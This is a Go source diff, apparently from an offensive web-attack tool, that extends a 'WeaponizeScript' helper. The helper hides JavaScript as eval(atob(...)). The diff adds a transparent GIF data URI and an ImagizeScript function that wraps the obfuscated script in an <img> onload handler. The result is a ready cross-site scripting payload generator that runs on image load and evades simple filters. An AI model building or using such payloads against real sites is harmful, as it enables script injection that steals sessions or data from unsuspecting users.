@@ -8,7 +8,11 @@ import (
 	minifyJS "github.com/tdewolff/minify/js"
 )
 
-// WeaponizeJavascript weaponizes a javascript script by making it minifying
+// TinyImage is the smalles possible transparent GIF image, encoded as a
+// data-uri (stackoverflow: /questions/9126105/blank-image-encoded-as-data-uri)
+var TinyImage = "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="
+
+// WeaponizeScript weaponizes a javascript script by making it minifying
 // it, then base64-ing it. The result should be an eval(atob('base64-encoded
 // -data')). An error is only returned if the minifier results in an error.
 func WeaponizeScript(js string) (string, error) {
@@ -24,4 +28,11 @@ func WeaponizeScript(js string) (string, error) {
 	}
 
 	return "eval(atob('" + buf.String() + "'))", nil
+}
+
+// ImageizeScript encodes javascript into an html image. An error is only
+// returned if the minifier results in an error.
+func ImagizeScript(js string) (string, error) {
+	weaponized, err := WeaponizeScript(js)
+	return `<img src="` + TinyImage + `" onload="javascript:` + weaponized + `">`, err
 }
